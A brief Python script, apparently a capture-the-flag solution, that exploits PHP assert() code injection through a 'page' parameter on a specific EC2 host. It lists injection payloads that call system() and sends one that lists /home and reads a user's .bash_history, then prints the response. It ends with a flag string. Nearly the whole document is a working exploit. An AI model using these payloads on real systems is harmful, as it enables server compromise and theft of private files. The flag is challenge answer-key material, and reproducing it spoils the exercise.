import requests

"""
assert("file_exists('$file')"): "file_exists('pages/index.php')" 
assert("strpos('$file', '..') === false")
>>> "strpos('pages/..php', '..') === false" 


' and die(var_dump(scandir('/home'))) or '
' and die(system('ls -la /home')) or '

"""
url = "http://ec2-3-122-234-106.eu-central-1.compute.amazonaws.com/ghost-user/index.php?page="
req = requests.get(url+"' and die(system('ls -la /home;cat /home/gh0st/.bash_history')) or '")
print(req.status_code)
print(req.text)

# FLAG{S@y_H3LL0_T0_TH3_D@rK_SiD3}